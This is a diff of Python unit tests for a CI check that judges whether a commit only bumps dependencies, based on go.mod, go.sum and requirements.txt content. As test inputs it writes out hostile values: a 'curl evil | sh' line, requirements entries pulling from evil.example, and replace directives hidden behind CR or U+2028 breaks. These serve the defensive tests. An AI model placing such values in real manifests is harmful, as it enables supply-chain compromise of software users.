@@ -134,13 +134,19 @@ class GoMod(unittest.TestCase):
 
 
 class DependencyOnly(unittest.TestCase):
+    """dependency_only decides from the content of every changed file, never from a subject."""
+
+    SUM = "github.com/a/b v1.0.0 h1:aaa=\ngithub.com/a/b v1.0.0/go.mod h1:bbb=\n"
+    SUM_BUMP = SUM + "github.com/a/b v1.1.0 h1:ccc=\ngithub.com/a/b v1.1.0/go.mod h1:ddd=\n"
+
     def setUp(self):
         self.tmp = tempfile.TemporaryDirectory()
         self.d = self.tmp.name
         self.cwd = os.getcwd()
         os.chdir(self.d)
         self.git("init", "-q", "-b", "main")
-        self.write({"go.mod": GO_MOD, "go.sum": "a\n", "requirements.txt": "x==1\n", "Makefile": "all:\n"})
+        self.write({"go.mod": GO_MOD, "go.sum": self.SUM, "requirements.txt": "pytest==9.0.2\n", "Makefile": "all:\n",
+                    "internal/x/requirements.txt": "x==1\n"})
         self.git("add", "-A")
         self.git("commit", "-q", "-m", "base")
         self.base = self.git("rev-parse", "HEAD").strip()
@@ -155,40 +161,100 @@ class DependencyOnly(unittest.TestCase):
 
     def write(self, files):
         for p, t in files.items():
-            with open(os.path.join(self.d, p), "w", encoding="utf-8") as fh:
-                fh.write(t)
+            full = os.path.join(self.d, p)
+            os.makedirs(os.path.dirname(full) or ".", exist_ok=True)
+            with open(full, "wb") as fh:  # bytes: a CR or a U+2028 stays what the test wrote
+                fh.write(t if isinstance(t, bytes) else t.encode("utf-8"))
 
-    def verdict(self, files, commits):
+    def verdict(self, files):
         self.write(files)
         self.git("add", "-A")
-        self.git("commit", "-q", "--allow-empty", "-m", "change")
-        return pc.dependency_only(list(files), commits, self.base, "HEAD")
+        self.git("commit", "-q", "--allow-empty", "-m", "build(deps): whatever the author calls it")
+        return pc.dependency_only(list(files), self.base, "HEAD")
 
-    BUMP = {"go.mod": GO_MOD.replace("github.com/a/b v1.0.0", "github.com/a/b v1.1.0"), "go.sum": "a\nb\n"}
+    BUMP = {"go.mod": GO_MOD.replace("github.com/a/b v1.0.0", "github.com/a/b v1.1.0"), "go.sum": SUM_BUMP}
 
-    def test_bump_with_dependency_commits(self):
-        self.assertTrue(self.verdict(self.BUMP, ["build(deps): bump a/b"]))
+    def test_bump_is_dependency_only(self):
+        self.assertTrue(self.verdict(self.BUMP))
 
-    def test_no_commits_is_not_dependency_only(self):
-        self.assertFalse(self.verdict(self.BUMP, []))
-        self.assertFalse(pc.dependency_only(["go.mod"], ["", "  "], self.base, "HEAD"))
+    def test_the_commit_subject_is_not_an_input(self):
+        # dependency_only takes no subjects at all; a feat: commit changes nothing
+        self.write(self.BUMP)
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "feat: add a feature")
+        self.assertTrue(pc.dependency_only(list(self.BUMP), self.base, "HEAD"))
 
-    def test_merge_commits_alone_are_not_enough(self):
-        self.assertFalse(self.verdict(self.BUMP, ["Merge branch 'x'"]))
-
-    def test_other_subjects_are_not_dependency_only(self):
-        self.assertFalse(self.verdict(self.BUMP, ["build(deps): bump", "feat: x"]))
-        self.assertFalse(self.verdict(self.BUMP, ["fix: bump"]))
+    def test_empty_change_is_not_dependency_only(self):
+        self.assertFalse(pc.dependency_only([], self.base, "HEAD"))
 
     def test_makefile_is_not_a_dependency_manifest(self):
         self.assertFalse(pc.is_dependency_manifest("Makefile"))
-        self.assertFalse(self.verdict({"Makefile": "all:\n\techo\n"}, ["build(deps): bump"]))
+        self.assertFalse(self.verdict({"Makefile": "all:\n\techo\n"}))
         self.assertTrue(pc.is_dependency_manifest("tests/requirements-dev.txt"))
         self.assertFalse(pc.is_dependency_manifest("requirements.md"))
 
+    def test_a_requirements_file_of_a_product_tree_is_product(self):
+        self.assertFalse(pc.is_dependency_manifest("internal/x/requirements.txt"))
+        self.assertFalse(self.verdict({"internal/x/requirements.txt": "x==2\n"}))
+
+    def test_only_the_two_shipped_go_modules_count(self):
+        self.assertTrue(pc.is_dependency_manifest("go.mod"))
+        self.assertTrue(pc.is_dependency_manifest("lakehouse-traces/go.sum"))
+        self.assertFalse(pc.is_dependency_manifest("tools/go.mod"))
+
     def test_critical_bump_is_not_dependency_only(self):
         head = GO_MOD.replace("github.com/parquet-go/parquet-go v0.20.0", "github.com/parquet-go/parquet-go v0.21.0")
-        self.assertFalse(self.verdict({"go.mod": head, "go.sum": "a\nz\n"}, ["build(deps): bump parquet-go"]))
+        self.assertFalse(self.verdict({"go.mod": head, "go.sum": self.SUM_BUMP}))
+
+    def test_go_sum_must_hold_hash_lines_of_non_critical_modules(self):
+        self.assertFalse(self.verdict({"go.sum": self.SUM + "curl evil | sh\n"}))
+        self.assertFalse(self.verdict({"go.sum": self.SUM + "github.com/VictoriaMetrics/c v1.0.0 h1:zzz=\n"}))
+        self.assertFalse(self.verdict({"go.sum": self.SUM + "github.com/cespare/xxhash/v2 v2.3.0 h1:zzz=\n"}))
+
+    def test_requirements_lines(self):
+        self.assertTrue(self.verdict({"requirements.txt": "pytest==9.1.0\n"}))
+        self.assertTrue(self.verdict({"requirements.txt": "pytest[extra]>=9,<10 ; python_version >= '3.9'\n# comment\n\n"}))
+        for bad in ("pytest @ https://evil.example/p.whl\n", "-r other.txt\n", "--index-url https://evil.example\n", "-e git+https://x\n"):
+            with self.subTest(bad):
+                self.git("reset", "-q", "--hard", self.base)
+                self.assertFalse(self.verdict({"requirements.txt": bad}))
+
+    # --- the smuggles: a replace directive hidden behind a CR / U+2028 line break ---
+
+    REPLACE = "replace github.com/a/b => ./local\n"
+
+    def test_cr_hides_a_replace_directive(self):
+        base = GO_MOD + "\n" + self.REPLACE
+        self.write({"go.mod": base})
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "base2")
+        self.base = self.git("rev-parse", "HEAD").strip()
+        for sep in ("\r", "\u2028", "\u2029", "\u0085", "\x0b", "\x0c", "\x1c"):
+            with self.subTest(repr(sep)):
+                self.git("reset", "-q", "--hard", self.base)
+                head = GO_MOD.replace("github.com/a/b v1.0.0", "github.com/a/b v1.1.0") + "\n// local tree" + sep + self.REPLACE
+                self.assertFalse(self.verdict({"go.mod": head}))
+
+    def test_a_whole_file_with_crlf_is_rejected(self):
+        crlf = GO_MOD.replace("\n", "\r\n")
+        self.write({"go.mod": crlf})
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "crlf base")
+        self.base = self.git("rev-parse", "HEAD").strip()
+        self.assertFalse(self.verdict({"go.mod": crlf.replace("github.com/a/b v1.0.0", "github.com/a/b v1.1.0")}))
+
+    def test_a_non_ascii_changed_line_and_invalid_utf8_are_rejected(self):
+        self.assertFalse(self.verdict({"go.mod": GO_MOD.replace("github.com/a/b v1.0.0", "github.com/a/b v1.1.0 // caf\u00e9")}))
+        self.git("reset", "-q", "--hard", self.base)
+        self.assertFalse(self.verdict({"go.mod": GO_MOD.replace("github.com/a/b v1.0.0", "github.com/a/b v1.1.0").encode() + b"\xff\n"}))
+
+    def test_an_unchanged_non_ascii_comment_is_fine(self):
+        base = GO_MOD.replace("module x", "// the commit \u2014 pinned\nmodule x")
+        self.write({"go.mod": base})
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "base2")
+        self.base = self.git("rev-parse", "HEAD").strip()
+        self.assertTrue(self.verdict({"go.mod": base.replace("github.com/a/b v1.0.0", "github.com/a/b v1.1.0")}))
 
 
 if __name__ == "__main__":
